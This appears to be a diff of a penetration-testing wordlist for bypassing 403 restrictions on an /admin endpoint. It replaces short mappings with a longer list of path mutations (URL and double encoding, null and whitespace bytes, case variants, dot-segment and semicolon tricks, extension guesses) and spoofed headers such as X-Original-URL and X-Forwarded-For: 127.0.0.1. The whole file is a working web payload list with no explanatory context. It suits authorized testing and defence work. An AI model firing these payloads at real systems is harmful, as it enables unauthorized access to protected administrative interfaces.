@@ -1,15 +1,76 @@
-/admin → /%2fadmin
-/admin → /admin/
-/admin → //admin//
-/admin → /admin/.
-/admin → /./admin
-/admin → /admin..;/
-/admin → /admin%09
-/admin → /admin%20
-/admin → /ADMIN
-/admin → /Admin
-GET /admin → POST /admin
-GET /admin → GET /admin HTTP/1.0
+/admin
+/admin/
+/admin//
+/admin/.
+//admin
+///admin
+/./admin
+/../admin
+/admin/../admin
+/./admin/./
+/admin%2f
+/admin%2F
+/admin%252f
+/admin%252F
+/admin%25252f
+/admin%2e
+/admin%2E
+/admin%252e
+/admin%00
+/admin%09
+/admin%20
+/admin%0a
+/admin%0d
+/admin%09/
+/admin%20/
+/admin%0a/
+/admin%0d/
+%2fadmin
+%2fadmin%2f
+%2Fadmin%2F
+%2fadmin/
+/%2fadmin
+/ADMIn
+/ADMIN
+/Admin
+/aDmIn
+/admin/../admin
+/./admin/.
+/admin/index.php
+/admin/index.html
+/admin.html
+/admin.php
+/admin.asp
+/admin.aspx
+/admin.jsp
+/admin.json
+/admin.xml
+/admin.txt
+/ADMIN
+/Admin
+/aDmin
+/adMin
+/admIn
+/admiN
+/AdMin
+/.admin
+/..admin
+/.admin/
+/;/admin
+/admin;/
+/admin;foo/
+/admin/;foo
+/admin?foo
+/admin?foo=bar
+/admin#
+/admin?
 X-Original-URL: /admin
 X-Rewrite-URL: /admin
 X-Custom-IP-Authorization: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Host: localhost
+X-Originating-IP: 127.0.0.1
